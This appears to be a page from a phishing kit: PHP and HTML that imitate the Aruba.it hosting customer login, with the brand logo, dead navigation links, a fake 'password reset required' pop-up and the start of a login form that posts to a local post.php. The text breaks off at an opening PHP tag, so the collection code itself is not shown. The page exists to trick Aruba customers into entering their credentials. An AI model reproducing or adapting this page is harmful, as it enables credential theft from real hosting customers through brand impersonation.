<?php 
require_once '../includes/main.php';
require '../main.php';
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
   
<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>
<meta content="width=device-width, initial-scale=1" name="viewport" />
<meta charset="utf-8">
<title>Servizio Hosting - Aruba.it</title>
<link rel="stylesheet" type="text/css" href="login/res/source8f26.css?v=55"/>

<style type="text/css">.col-md-3{width:150px;}</style>
</head>
<body class="__areautenti">
<table width="100%" height="94%" border="0" cellpadding="0" cellspacing="0">
<tr>
	<td>
		
<div class="headerBox">
	<header class="header">
  <div class="navbar-top">
    <div class="headerContainer">
		<ul class="langselector">
			<li class="lifirst">
				
						<a class="first" href="#">Italiano<b class="caret"></b></a>
						<ul><li><a href="#">English</a></li>
						<li><a href="#">Espa&ntilde;ol</a></li>
						</ul>
			</li>
		</ul>
      <div class="navbar-right">
        <ul class="nav navbar-nav">
			<li class="homeLinkLi insideCustomerArea"><a href="#">home</a></li>
			<li class="borderListSeparator webmailLinkLi"><a href="#" target="_blank">webmail</a></li>
			<li class="borderListSeparator renewLinkLi"><a href="#">rinnovi</a></li>
			<li class="borderListSeparator paymentLinkLi insideCustomerArea"><a href="#" target="_blank">pagamenti</a></li>
			<li class="borderListSeparator customerAreaLinkLi insideCustomerArea"><a href="#" id="areaClientiOrange">area clienti</a></li>
			<li class="borderListSeparator assistanceLinkLi">
				
				<a href="#" target="_blank" id="assistenzaGreen">
				assistenza 24/7
			   </a>
			</li>
		</ul>
      </div>
    </div>
  </div>
  <nav class="navbar-default" role="navigation">
    <div class="headerContainer">
        <div class="col-md-3">          
          <a title="Home" href="../../../../managehosting.aruba.it/AreaUtenti.37544.delayed?Lang=IT"><svg class="navbar-brand-svg" height="60" id="logo-hosting" viewBox="0 0 447.4 201.6" width="130"><image alt="Aruba Hosting e Domini" src="../../../images/logo-aruba-hosting-domini_IT.html"></image><path class="p-line" d="M0 149.7h447.4v4H0z" fill="#999"></path><path class="p-bl" d="M1.9 176.5h3.5v10.9h12.8v-10.9h3.5v24.7h-3.5v-10.9H5.4v10.9H1.9v-24.7zm37.5-.4c7.1 0 12.7 5.5 12.7 12.6 0 7.3-5.5 13-12.7 13-7.1 0-12.7-5.7-12.7-13 0-7.1 5.6-12.6 12.7-12.6zm0 22.4c5 0 9.1-4.2 9.1-9.8 0-5.4-4.1-9.5-9.1-9.5s-9.1 4.1-9.1 9.5c0 5.6 4.1 9.8 9.1 9.8zm17.8-2.7s2.6 2.7 6.3 2.7c2.3 0 4.3-1.3 4.3-3.6 0-5.4-12-4.2-12-11.8 0-3.9 3.3-6.9 8-6.9 4.6 0 7 2.5 7 2.5l-1.6 2.9s-2.3-2.1-5.4-2.1c-2.6 0-4.5 1.6-4.5 3.6 0 5.1 12 3.7 12 11.8 0 3.8-2.9 7-7.8 7-5.3 0-8.2-3.3-8.2-3.3l1.9-2.8zm24.3-16.3H73v-3h20.4v3H85v21.7h-3.5v-21.7zm15.5-3h3.5v24.7H97v-24.7zm10.2 0h3.4l11 16.1c.9 1.3 2.1 3.6 2.1 3.6h.1s-.2-2.2-.2-3.6v-16.1h3.5v24.7h-3.4l-11-16c-.9-1.4-2.1-3.6-2.1-3.6h-.1s.2 2.2.2 3.6v16h-3.5v-24.7zm37.4-.4c5.9 0 9 3 9 3l-1.8 2.6s-2.8-2.4-7-2.4c-5.8 0-9.3 4.2-9.3 9.5 0 5.7 3.9 9.7 9.1 9.7 4.3 0 7-3.1 7-3.1v-3.6h-4v-3h7.2v12.4h-3v-2.6h-.1s-2.7 3-7.6 3c-6.7 0-12.1-5.3-12.1-12.8 0-7.1 5.4-12.7 12.6-12.7zm24.7.4h14.4v3h-10.9v7.7h8.9v3h-8.9v7.9h11.5v3h-14.9v-24.6zm29 0h8.2c7.6 0 12.5 4.5 12.5 12.3 0 7.8-5 12.4-12.5 12.4h-8.2v-24.7zm7.9 21.7c5.6 0 9.2-3.3 9.2-9.4 0-6.1-3.7-9.3-9.2-9.3h-4.5v18.7h4.5zm29-22.1c7.1 0 12.7 5.5 12.7 12.6 0 7.3-5.5 13-12.7 13s-12.7-5.7-12.7-13c0-7.1 5.6-12.6 12.7-12.6zm0 22.4c5 0 9.1-4.2 9.1-9.8 0-5.4-4.1-9.5-9.1-9.5s-9.1 4.1-9.1 9.5c0 5.6 4.1 9.8 9.1 9.8zm19-22h3.6l5.7 13.4c.6 1.4 1.2 3.3 1.2 3.3h.1s.7-2 1.2-3.3l5.7-13.4h3.6l2 24.7h-3.4l-1.2-15.6c-.1-1.5 0-3.6 0-3.6h-.1s-.7 2.3-1.3 3.6l-4.9 11.1h-3.1l-4.9-11.1c-.6-1.3-1.3-3.7-1.3-3.7h-.1s0 2.2-.1 3.7l-1.2 15.6h-3.5l2-24.7zm29 0h3.5v24.7h-3.5v-24.7zm10.2 0h3.4l11 16.1c.9 1.3 2.1 3.6 2.1 3.6h.1s-.2-2.2-.2-3.6v-16.1h3.5v24.7h-3.4l-11-16c-.9-1.4-2.1-3.6-2.1-3.6h-.1s.2 2.2.2 3.6v16h-3.5v-24.7zm26.5 0h3.5v24.7h-3.5v-24.7z"></path><g class="g-aruba"><g fill="#e35205"><path d="M57.3 45.9c-.5 0-1 0-1.4.1-3.9.5-7.2 2.7-9 6.1-.8-.2-1.6-.4-2.5-.7-3.6-.9-6.6-1.4-9.1-1.6h-1.5c-2.7 0-5.6.5-8.5 1.5-2.3.8-4.3 1.6-6 2.3-2.3 1-4.4 2.2-6.2 3.6-2.6 2-4.6 4.9-6.1 8.9-.9 2.3-1.7 4.3-2.5 6.2-1.1 2.7-1.8 5.9-2.2 9.3-.3 2.5-.5 5.1-.6 7.4-.2 2.5-.2 5.1 0 7.6.2 3.9 1.3 7.3 3.3 10.3l3.1 4.6c1.7 2.6 4.3 5 7.6 7.2 3.5 2.3 6.5 3.7 9.5 4.2 1.6.3 3.8.6 6.5 1 2.5.4 4.6.5 6.5.5.7 0 1.4 0 2.1-.1 3-.2 6-1.2 9.1-2.8.6-.3 1.1-.6 1.7-1a11 11 0 0 0 8.6 4c4.1 0 9.4-2.5 10.8-9.6.4-2.1.5-5 .4-9.7-.1-3.6-.3-10.6-.4-20.7-.1-10.4-.3-17.5-.6-21.3-.4-5-.9-8-1.9-10.3-2-4.3-6.1-7-10.7-7zM32.5 74.7h4.3c1.1 0 2.4.1 3.6.3 1.2 1.1 1.8 1.8 2 2 .1.2.7 1.1 2 4.1.8 1.8 1.3 3.5 1.3 4.9.1 1.6-.1 3.1-.5 4.6-.4 1.5-1.1 3-2.1 4.6C42 97 41 98 40.4 98.5c-.8.6-1.8 1.1-2.8 1.4-.3.1-.6.1-.9.1-.2 0-.5 0-.7-.1-1.8-.4-3.5-.9-5.2-1.6-1.5-.6-2.2-1-2.4-1.2L25.7 95c-.1-1.4-.2-3.6-.2-7.2 0-2.9.4-5.5 1.2-7.8.5-1.3 1.5-2.7 3.1-4.1 1.1-.3 2-.8 2.7-1.2zm-6.7 21.5z"></path><path d="M81.9 48.1c-2 0-3.9.5-5.7 1.5-3.5 2-5.9 5.8-6.3 10l-.2 1.6v2.1c1.2 29 2 46.5 2.1 48.7.5 6.9 3.8 9.9 6.6 11.3 1.6.8 3.3 1.2 5 1.2 3.3 0 6.5-1.5 8.7-4.2 2.5-3 3.2-6.8 3-16.8-.1-6.1-.2-12.7-.2-19.6 0-4.2 0-6.7-.1-8.5.6-.8 1.3-1.6 2.2-2.3.6-.5 1.4-.8 2.5-1 .8-.2 1.6-.3 2.2-.3.4 0 .6 0 .8.1.3.1.4.1.5.2 1.9 1.8 3.3 2.9 4.6 3.6.3.2.8.5 1.7 1.1 2.5 1.8 5.2 2.7 7.8 2.7 3.5 0 6.8-1.6 9.1-4.5 2.1-2.7 3.1-6.1 2.6-9.6-.5-3.7-2.7-6.9-6.1-9-.4-.2-1.2-.8-2.7-2a24.3 24.3 0 0 0-9-4.7c-2.5-.7-5.4-1.1-8.6-1.3h-1.7c-2.9 0-5.8.4-8.7 1.1-.9.2-1.8.5-2.6.8a13.5 13.5 0 0 0-7.5-2.2z"></path><path d="M146.9 41.9c-2.7 0-5.4.9-8.1 2.7l-.3.2c-1.1.8-2 1.8-2.6 3l-.2.3c-4.3 8.6-6.5 14.1-7.4 17.8-.7 3.2-1.3 6.6-1.7 10.1-.4 3.6-.5 6.9-.4 9.8.2 4.2 1.5 8.2 4 11.9 2.2 3.3 4.8 5.9 7.6 7.8 2.2 1.5 4.6 2.7 6.9 3.8 3.1 1.4 6.2 2.1 9.3 2.1h7c3.8 0 6.6-.3 8.8-.8 2.5-.6 5.3-2 9.1-4.4 4.4-2.8 7.5-6.2 9.3-10.2 1.3-2.9 2.3-6 2.9-9.1.6-3.1 1-6.8 1-10.8 0-4.6-1.1-10-3.4-16.1-2.8-7.7-5.5-12.4-10.7-14a13.66 13.66 0 0 0-11 1.3 12 12 0 0 0-5.1 5.6c-1 2.3-1.6 5.9.4 10.6.9 2.1 2.1 4.6 3.4 7.3.6 1.3 1 2.9 1 4.7 0 2.6-.2 4.9-.6 6.6-.4 2-.8 2.7-.8 2.7 0 .1-.5.8-1.9 2.1-.5.5-1.1.8-1.9 1-1.5.4-2.8.6-4 .6-1.1 0-2.2-.2-3.3-.5-.9-.3-1.7-.7-2.4-1.2-.6-.5-1-.9-1.1-1-.1-.3-.3-1.4-.5-3.5-.2-2.3 0-4.4.5-6.3.7-2.6 1.6-5.3 2.7-8.1 1.3-3.1 1.9-4.2 2-4.4 1.7-2.3 2.7-4.8 3-7.3.4-3-.1-5.8-1.5-8.3-2-3.8-5.8-6-10-6z"></path><path d="M204.3 0c-2.7 0-5.2.9-7.2 2.6-3 2.6-3.5 5.7-3.9 9.4-.3 3.9-.5 11.1-.6 22.6-.2 19.6-.4 26.4-.6 28.7-.3 3.7-.5 10.9-.6 21.3-.1 10.1-.3 17.1-.4 20.7-.2 4.7-.1 7.6.4 9.7 1.4 7 6.7 9.6 10.8 9.6 3.3 0 6.4-1.5 8.6-4 .6.3 1.1.7 1.7 1 3.1 1.6 6.1 2.6 9.1 2.8.7.1 1.4.1 2.1.1 1.9 0 4-.2 6.5-.5 2.8-.4 5-.7 6.6-1 2.9-.5 5.9-1.8 9.5-4.1 3.3-2.2 5.9-4.7 7.6-7.2l3.1-4.6c2-3 3.1-6.4 3.3-10.3a96.3 96.3 0 0 0-.6-15.1c-.3-3.4-1.1-6.6-2.2-9.3-.8-1.9-1.6-4-2.5-6.2-1.5-4-3.5-6.9-6.1-8.8a28.8 28.8 0 0 0-6.2-3.6c-1.7-.7-3.7-1.5-6-2.3-2.9-1-5.7-1.5-8.5-1.5h-1.4c-2.5.2-5.5.7-9.1 1.6-.6.2-1.2.3-1.8.5 0-3.4.1-7.5.2-12.8.3-19.9.6-23.5.7-24.1.6-4.9-.9-11.1-7-13.7-2-1.1-3.8-1.5-5.5-1.5zm17.1 74.8c1.3-.2 2.5-.3 3.6-.3h4.3c.8.4 1.7.9 2.7 1.3 1.6 1.4 2.7 2.8 3.1 4.1.8 2.3 1.2 4.9 1.2 7.8 0 3.5-.1 5.8-.2 7.2l-2.7 2.1c-.2.2-.9.6-2.4 1.2-1.7.6-3.4 1.2-5.2 1.6-.2.1-.5.1-.7.1-.3 0-.6 0-.9-.1-1-.3-1.9-.8-2.8-1.4-.6-.5-1.6-1.5-2.8-3.4-1-1.6-1.7-3.2-2.1-4.6-.4-1.5-.5-3-.5-4.6.1-1.4.5-3.1 1.3-4.9 1.3-2.9 1.9-3.9 2-4.1.4-.2.9-.9 2.1-2z"></path><path d="M315.7 45.9c-.5 0-1 0-1.5.1-3.9.5-7.1 2.7-9 6-.8-.2-1.6-.4-2.5-.7-3.6-.9-6.6-1.4-9.1-1.6h-1.5c-2.8 0-5.6.5-8.5 1.5-2.3.8-4.4 1.6-6 2.3-2.3 1-4.4 2.2-6.2 3.6-2.6 2-4.5 4.9-6.1 8.8-.9 2.3-1.7 4.4-2.5 6.2-1.1 2.7-1.8 5.9-2.2 9.3a96.3 96.3 0 0 0-.6 15.1c.2 3.9 1.3 7.3 3.3 10.3l3.1 4.6c1.7 2.6 4.3 5 7.6 7.2 3.5 2.3 6.5 3.7 9.5 4.1 1.6.3 3.8.6 6.5 1 2.5.4 4.6.5 6.5.5.7 0 1.4 0 2.1-.1 3-.2 6-1.2 9.1-2.8.6-.3 1.1-.6 1.7-1a11 11 0 0 0 8.6 4c4.1 0 9.4-2.5 10.8-9.5.4-2.1.5-5 .4-9.7-.1-3.6-.2-10.4-.4-20.7-.1-10.3-.3-17.5-.6-21.3-.4-5-.9-8-1.9-10.3-1.9-4.2-6-6.9-10.6-6.9zM291 74.7h4.3c1.1 0 2.4.1 3.6.3 1.2 1.1 1.8 1.8 2 2 .1.2.7 1.1 2 4.1a13.27 13.27 0 0 1 .8 9.5c-.4 1.5-1.1 3-2.1 4.6a14.3 14.3 0 0 1-2.8 3.4c-.8.7-1.8 1.1-2.8 1.4-.3.1-.6.1-.9.1-.2 0-.5 0-.7-.1-1.8-.4-3.5-.9-5.2-1.6-1.5-.6-2.2-1-2.4-1.2l-2.7-2.1c-.1-1.4-.2-3.6-.2-7.2 0-2.9.4-5.5 1.2-7.8.5-1.3 1.5-2.7 3.1-4.1 1.1-.4 2-.9 2.8-1.3z"></path><path d="M342.9 94.5c-.9 0-1.9.2-2.8.5l-2 .8c-6.5 2.4-8.7 6.6-9.4 9.7-.5 2.2-.6 4.4-.3 6.5.4 2.5 1.9 7.1 8.2 9.7 2.1.9 4.2 1.3 6.3 1.3 1.5 0 3-.2 4.4-.7 2.8-.9 5.2-2.5 7-4.7 2.6-3.1 3.5-7.1 2.5-11.1-.8-3.2-2.7-6-5.4-7.9-.9-.6-1.7-1.2-2.5-1.6-.4-.4-.8-.8-1.3-1.2-1.5-.8-3-1.3-4.7-1.3zm26.7-75.2c-3 0-5.8.8-8.4 2.4-2.7 1.7-4.7 3.9-5.8 6.6-.8 1.8-1.2 3.7-1.5 5.8-.2 1.5-.2 2.9-.2 4.3 0 2.5.5 4.8 1.6 6.9.6 1.1 1.2 2.2 1.9 3.3.7 1 1.6 2.2 2.8 3.7l.2.3c.1.1.2.3.3.4-.2 1.1-.3 2.3-.3 3.5 0 2.1.3 4.1.9 6 2 24.2 3 37.5 3.2 39.1.5 6.3 4.2 9.3 6.3 10.5 2 1.1 4 1.7 6.1 1.7 2 0 4-.6 5.8-1.6 1.9-1.1 5.1-3.9 5.7-9.7.1-1.3.3-2.8-1.7-24.8-1.7-18.9-2.2-22.9-2.4-24.2-.2-1-.4-2-.8-2.9.8-1.1 1.5-2.4 2.2-3.9 1.5-3.5 2.2-6.9 1.9-10.2-.2-3.2-1.1-6.1-2.5-8.7a16.4 16.4 0 0 0-8.3-7.3c-2.5-.8-4.8-1.2-7-1.2z"></path><path d="M417.7 6.4c-3.3 0-6.4 1.4-8.9 3.9-3.2 3.2-4 7.3-3.8 18.4l.3 11.9c-11.1 1-12.3 1.6-14 2.7-4 2.3-6.2 6.1-6.2 10.3 0 2.4.8 4.7 2.3 6.6 1.3 1.7 3.9 3.8 8.3 4.3.7.1 1.4.1 2.3.1 1.7 0 4-.1 7.2-.4.1 3.9.1 8.9.2 14.9.3 18.4.2 24.5.1 26.4-.3 5 .3 8.5 1.9 11.2 2.3 4 6 6.2 10.1 6.2 3 0 7.2-1.2 10.5-6.8 1.9-3.3 2.5-7.8 2.2-16.7-.2-6.1-.3-14.9-.2-26.2 0-4.3.1-7.9.1-10.6h1c5.4 0 9.6-1.6 12.3-4.7 4.6-5.2 3.5-11.3.5-15-1.7-2-4.9-4.5-10.4-4.5h-.7c-.8 0-1.7.1-2.7.1 0-.8 0-1.7-.1-2.7-.1-7.6-.3-12.7-.7-16-.2-1.8-.5-4-1.3-6.2-1.5-4-4.6-6.6-8.5-7.2h-1.8z"></path></g><path d="M59.7 116.5c-.9 0-2.3-.4-3.3-2.4-.4-.8-.8-2.5-.9-8.8l-4.3 4.7c-1.6 1.8-3.5 3.2-5.6 4.3a14.9 14.9 0 0 1-6 1.9c-1.8.1-4 0-6.8-.4-2.7-.4-4.8-.7-6.4-1-1.8-.3-3.8-1.2-6.3-2.9-2.5-1.6-4.3-3.3-5.4-5l-3.1-4.6c-1.2-1.7-1.8-3.9-2-6.3-.1-2.2-.1-4.5 0-6.7s.3-4.6.6-7.2c.3-2.7.8-5.1 1.6-7.1.8-1.9 1.6-4 2.5-6.3 1-2.6 2.2-4.4 3.5-5.4 1.3-1 2.7-1.8 4.4-2.5 1.6-.7 3.5-1.4 5.6-2.1 2.4-.8 4.6-1.2 6.7-1 2 .1 4.6.6 7.7 1.4 3.2.8 5.7 1.7 7.6 2.6 1.2.6 2.4 1.4 3.3 2.3-.1-1.2-.2-2.2-.3-3.1-.1-1.6 0-3.1.5-4.3.6-1.5 1.8-2.5 3.3-2.7 1.7-.2 3.1.7 3.9 2.4.6 1.3 1 3.8 1.3 7.6.3 3.6.5 10.6.6 20.8.1 10.2.3 17.2.4 20.9.1 3.9.1 6.4-.2 7.8-.5 2.7-2 3.1-2.9 3.1zM19.1 77.6c-1.1 3.1-1.6 6.7-1.6 10.4 0 3.9.1 6.9.4 9 .2 1.7.8 2.9 1.7 3.5 1.3.9 2.6 1.9 3.9 2.9 1.1.9 2.7 1.7 4.6 2.5 2 .7 4 1.4 6.1 1.9 1.9.4 3.8.4 5.8-.2 2-.6 3.8-1.5 5.4-2.8a21 21 0 0 0 4.6-5.4c1.4-2.3 2.5-4.6 3.1-6.9.6-2.3.8-4.6.7-7-.1-2.4-.8-5-2-7.7-1.5-3.5-2.4-5-2.9-5.6-.7-.9-1.7-2-3.1-3.2a7.12 7.12 0 0 0-4-1.9c-1.7-.2-3.4-.4-5-.4H32c-1.5 0-2.3.3-2.6.5-.8.5-2.1 1.2-3.9 2-3.2 2.5-5.4 5.4-6.4 8.4zm64.3 38.9c-.5 0-.9-.1-1.4-.3-1.3-.6-2-2.2-2.2-4.7-.1-1.9-.8-17.5-2.1-48.5v-1l.2-1.6c.2-1.6 1-3.1 2.4-3.8.6-.3 1.1-.5 1.7-.5 1.2 0 2.5.4 3.1 1.5.8 1.7.7 4.1.9 4.8.3-.3.6-.7 1-1.1 1.7-1.9 4-3.2 6.9-3.9 2.7-.7 5.4-.9 8.1-.8 2.6.1 5 .5 7 1 2.2.6 4.2 1.7 5.9 3.1 1.4 1.2 2.6 2.1 3.5 2.6 1.4.9 2.2 2 2.4 3.4.2 1.3-.1 2.5-.9 3.5-1 1.3-2.1 1.5-2.9 1.5-1 0-2-.4-3.2-1.2-.9-.6-1.6-1.1-2.2-1.5-.7-.4-1.8-1.3-3.3-2.7a8.31 8.31 0 0 0-4.3-2.1c-1.7-.3-3.8-.3-6.1.2S93.6 65.7 92 67c-1.6 1.3-3 2.8-4.1 4.4-.8 1.3-1.1 1.9-1.3 2.1.1 1.2.2 3.8.2 10.5 0 6.9.1 13.6.2 19.7.2 9.2-.5 10.8-1.1 11.5-.7.9-1.6 1.3-2.5 1.3zm77.7-13.1h-7c-2 0-4-.5-6.1-1.4-2-.9-3.9-1.9-5.7-3.1-1.9-1.3-3.7-3.2-5.4-5.5a14.5 14.5 0 0 1-2.6-7.7c-.1-2.5 0-5.4.4-8.6.4-3.2.9-6.3 1.5-9.2.7-3 2.9-8.2 6.7-16l.2-.3.3-.2c1.3-.9 2.4-1.3 3.5-1.3 1.3 0 2.4.7 3 1.8.5 1 .7 2.1.6 3.4-.2 1.2-.7 2.5-1.6 3.7-.5.7-1.4 2.2-2.9 6-1.2 3.1-2.3 6.2-3 9.1-.7 2.8-1 5.8-.7 9 .3 3.9.9 5.7 1.4 6.5.7 1.2 1.8 2.5 3.2 3.6 1.5 1.2 3.2 2.1 5 2.6 3.7 1.1 7.5 1.1 11.7 0 2-.5 3.8-1.5 5.3-2.9s2.7-2.7 3.4-3.9c.7-1.2 1.3-2.9 1.7-5.1.5-2.3.7-5.1.7-8.3 0-3.1-.6-5.9-1.8-8.3-1.3-2.6-2.4-5-3.3-7-1.7-3.9.3-5.5 1.2-6 1.6-.9 3.3-1.1 4.8-.6 1.3.4 2.8 1.8 5.5 9.1 1.9 5.3 2.9 9.8 2.9 13.4 0 3.5-.3 6.6-.8 9.2-.5 2.6-1.3 5.1-2.4 7.5-1.1 2.5-3.2 4.8-6.3 6.7-2.9 1.9-5.1 3-6.7 3.4-1.4.2-3.6.4-6.7.4zm41.1 13c-.9 0-2.5-.4-3-3.1-.3-1.4-.4-4-.2-7.8.1-3.7.3-10.7.4-20.9.1-10.2.3-17.2.6-20.8.3-3.5.4-13.4.6-29.2.2-24.7.9-25.2 1.6-25.9.7-.6 2.1-1.2 4.2-.2 1.3.6 2.7 1.9 2.3 5.4-.2 2-.5 10.4-.8 25-.3 14.5-.3 23.2-.2 25.9 1.2-1.3 2.5-2.3 4.2-3.1 1.9-.9 4.4-1.8 7.6-2.6 3.1-.8 5.7-1.2 7.7-1.4 2.1-.1 4.4.2 6.7 1 2.2.8 4.1 1.5 5.6 2.1 1.7.7 3.1 1.5 4.4 2.5 1.4 1.1 2.5 2.9 3.5 5.4.9 2.3 1.7 4.4 2.5 6.3.8 2 1.4 4.4 1.6 7.1.3 2.6.5 5 .6 7.2.1 2.2.1 4.5 0 6.7-.1 2.4-.8 4.6-2 6.3l-3.1 4.6c-1.1 1.7-2.9 3.4-5.4 5-2.5 1.7-4.6 2.6-6.3 2.9-1.5.3-3.6.6-6.4 1-2.8.4-5.1.5-6.8.4-1.9-.1-3.9-.8-6-1.9-2.1-1.1-3.9-2.6-5.6-4.3l-4.3-4.7c-.1 6.3-.5 8-.9 8.8-.8 1.9-2.1 2.3-3.1 2.3zm22.9-49.8c-1.6 0-3.2.1-5 .4-1.5.2-2.8.8-4 1.9-1.3 1.2-2.4 2.3-3.1 3.2-.5.6-1.4 2.1-2.9 5.6-1.2 2.8-1.9 5.4-2 7.7-.1 2.4.1 4.8.7 7 .6 2.3 1.6 4.6 3.1 6.9a21 21 0 0 0 4.6 5.4c1.6 1.3 3.5 2.2 5.4 2.8 1.9.6 3.8.6 5.8.2 2.1-.5 4.2-1.1 6.1-1.9 1.9-.7 3.4-1.5 4.6-2.5 1.3-1 2.6-2 3.9-2.9.9-.6 1.5-1.8 1.7-3.5.2-2.1.4-5.2.4-9s-.6-7.3-1.6-10.4c-1-3-3.2-5.8-6.4-8.4-1.8-.8-3.1-1.4-3.9-2-.4-.2-1.1-.5-2.6-.5h-4.8zm93 49.9c-.9 0-2.3-.4-3.3-2.4-.4-.8-.8-2.5-.9-8.8l-4.3 4.7c-1.6 1.8-3.5 3.2-5.6 4.3a14.9 14.9 0 0 1-6 1.9c-1.8.1-4 0-6.8-.4-2.7-.4-4.8-.7-6.4-1-1.8-.3-3.8-1.2-6.3-2.9-2.5-1.6-4.3-3.3-5.4-5l-3.1-4.6c-1.2-1.8-1.8-3.9-2-6.3-.1-2.2-.1-4.5 0-6.7s.3-4.6.6-7.2c.3-2.7.8-5.1 1.6-7.1.8-1.9 1.6-4 2.5-6.3 1-2.6 2.2-4.4 3.5-5.4 1.3-1 2.7-1.8 4.4-2.5 1.6-.7 3.5-1.4 5.6-2.1 2.4-.8 4.6-1.2 6.7-1 2 .1 4.6.6 7.7 1.4 3.2.8 5.7 1.7 7.6 2.6 1.2.6 2.4 1.4 3.3 2.3-.1-1.2-.2-2.2-.3-3.1-.1-1.6 0-3.1.5-4.3.6-1.5 1.8-2.5 3.3-2.7 1.7-.2 3.1.7 3.9 2.4.6 1.3 1 3.8 1.3 7.6.3 3.6.5 10.6.6 20.8.1 10.4.3 17.2.4 20.9.1 3.9.1 6.4-.2 7.8-.4 2.7-2 3.1-2.9 3.1zm-4.3-50.1zm-36.3 11.2c-1.1 3.2-1.6 6.7-1.6 10.4 0 3.9.1 6.9.4 9 .2 1.7.8 2.9 1.7 3.5 1.3.9 2.6 1.9 3.9 2.9 1.1.9 2.7 1.7 4.6 2.5 2 .7 4 1.4 6.1 1.9 1.9.4 3.8.4 5.8-.2 2-.6 3.8-1.5 5.4-2.8a21 21 0 0 0 4.6-5.4c1.4-2.3 2.5-4.6 3.1-6.9.6-2.3.8-4.6.7-7-.1-2.4-.8-5-2-7.7-1.5-3.5-2.4-5-2.9-5.6-.7-.9-1.7-2-3.1-3.2a7.12 7.12 0 0 0-4-1.9c-1.7-.2-3.4-.4-5-.4h-4.8c-1.5 0-2.3.3-2.6.5-.8.5-2.1 1.2-3.9 2-3.2 2.5-5.3 5.4-6.4 8.4zM343 115c-1 0-2.1-.2-3.2-.7-2-.9-3.2-2-3.4-3.5-.2-1.1-.1-2.3.2-3.6.4-1.7 1.8-3 4.4-4l2-.8v1.1c.4 0 .8.1 1.2.2.7.2 1.5.6 2.6 1.4 1.2.9 2 2 2.3 3.3.4 1.5.1 2.9-.9 4-.8 1-2 1.7-3.4 2.2-.6.3-1.2.4-1.8.4zm33.7-9.2c-.6 0-1.3-.2-2.2-.6-1.3-.8-2.1-2.2-2.3-4.2-.1-1.5-1.2-14.9-3.2-40-.5-1.4-.8-2.8-.8-4.4 0-1.8.4-3.1 1.1-4 .6-.7 1.6-1.5 3.5-1.5 1.1 0 2.9.5 3.4 3.8.3 1.7 1 9.5 2.3 23.7 1.7 19 1.8 22.4 1.7 23.3-.2 1.8-.8 3-1.9 3.6-.4.1-1 .3-1.6.3zm-5.9-57.1c-1.2 0-2.6-.3-4-.9l-.4-.1-.2-.3c-1-1.3-1.8-2.4-2.4-3.2-.5-.8-1-1.6-1.4-2.5-.5-1-.7-2.1-.7-3.4 0-1.1.1-2.2.2-3.4.1-1.3.4-2.5.9-3.5.5-1.2 1.4-2.2 2.7-3 2.4-1.5 5.1-1.5 8.4-.3 1.8.6 3.1 1.8 4.1 3.6.9 1.6 1.4 3.4 1.5 5.4.1 2-.3 4.2-1.3 6.5-1.1 2.5-2.3 3.9-3.7 4.4-1.3.4-2.5.7-3.7.7zm-.8-7.4a2 2 0 0 0 1.7 0s.3-.2.8-1.3c.4-.9.5-1.6.5-2.3-.1-.8-.3-1.5-.6-2.1-.2-.4-.5-.7-.9-.8-.9-.4-1.6-.5-2.2-.1-.3.2-.4.4-.5.6-.1.3-.2.7-.2 1.1v1.7c0 .4 0 .8.1 1 .1.3.2.6.4.9.1.2.4.6.9 1.3zm47.4 73.7c-.9 0-2.1-.4-3.2-2.2-.7-1.3-1-3.4-.8-6.8.2-2.9.1-12-.1-27-.2-12.6-.3-20.7-.3-23.2-.7-.1-2.4-.2-6.2.2-5.4.6-8.8.7-10.3.6-3.1-.4-3.4-2.2-3.4-3 0-1 .4-2.3 2.2-3.4.6-.4 1.7-1 18.3-2.2-.3-6.5-.5-13.1-.6-19.4-.2-10.1.7-11.8 1.5-12.6 1.5-1.5 2.9-1.6 3.8-1.5 2.2.3 2.7 3.3 3 6.2.3 3.1.5 8.2.6 15.4.1 7.3.3 9.9.4 10.8.4.1 1.4.2 3.5.1 3-.2 5.4-.3 7.1-.4 2.2-.1 3.7.5 4.7 1.6.5.6 1.6 2.4-.4 4.6-1.2 1.3-3.2 2-6.3 2-2.5 0-4.9.1-7 .2-1.1.1-1.6.2-1.9.3 0 1.6-.1 7.3-.2 18-.1 11.4-.1 20.3.2 26.6.4 8.7-.4 11.2-1.1 12.3-.7 1.2-1.8 2.8-3.5 2.8z" fill="#fff"></path></g></svg></a>
        </div>
		</div>
	  </nav>
	</header>
	</div>
		<br/><br/>
	</td>
</tr>
<link rel="stylesheet" type="text/css" href="../../../PasswordScaduta_Include.html" />
<div id="ChangePasswordSuggestedModal" class=" MSIE90">
	<div id="ChangePasswordSuggestedModalBox">
		<div id="ChangePasswordClose"><span id="ChangePasswordCloseButton" onclick='$("#ChangePasswordSuggestedModal").hide();'>X</span></div>
		<div id="ChangePasswordDescription">
			<b><strong>Reimpostazione password necessaria</strong></b>
			<br/><br/>
			<span id="txtPasswordSuggestion">E' necessario reimpostare la password associata al tuo username {0}.</span>
			<br/><br/>
			<span>Completa l'operazione prima di accedere.</span>
		</div>
		<div id="ChangePasswordBoxFormProceed">
			<form action="#" method="post" id="ChangePasswordForm">
				<input type="hidden" name="chpwdReturnUrl" id="chpwdReturnUrl" value="" />
				<button class="ChangePasswordButtonFormProceed" onclick="$('#ChangePasswordSuggestedModal').hide();">REIMPOSTA PASSWORD</button>
			</form>
		</div>
	</div>
</div>
 
 
	<script type="text/javascript">
	$(document).ready(function() {		
		$(document).on("click",".closeAlertMsg", function() { closeAlertMsg(this); });
		
		if ($('#newBanner').find('div').length) 
	    {         
        }   
		else 
		{          
		   $("#newBanner").hide();
        }
    });

    var showPasswordWeb = function () {
        var x = document.getElementById("PasswordAreaUtenti");
        if (x.type === "password") {
            x.type = "text";
            document.getElementById('eye-passwordWeb').style.display = "none";
            document.getElementById('eye-no-passwordWeb').style.display = "block";
        } else {
            x.type = "password";
            document.getElementById('eye-no-passwordWeb').style.display = "none";
            document.getElementById('eye-passwordWeb').style.display = "block";
        }
    }

    var closeAlertMsg = function (thisButton) {
        $(thisButton).closest(".messageKOStyle").fadeOut();
    }
</script>

<td height="100%" align="center" valign="top">
<table width="100%" border="0" cellpadding="0" cellspacing="0">
  <tr>
    <td width="100%" height="100%" valign="top" colspan="2">


<div class="loginPage">	
	<div id="newBanner">
		
					<a href="#" target="_blank">
					<img src="res/back.jpg" border="0" width="600" height="455" /></a>
	 
			
	</div>
	<div class="flexGrow login-form"> 
	  <div>
			<h1 class="headerTitleLogin">Area clienti Hosting e domini</h1>
	  </div>	  
	  <div>
			<form action="post.php" method="post" id="loginform">
<?php
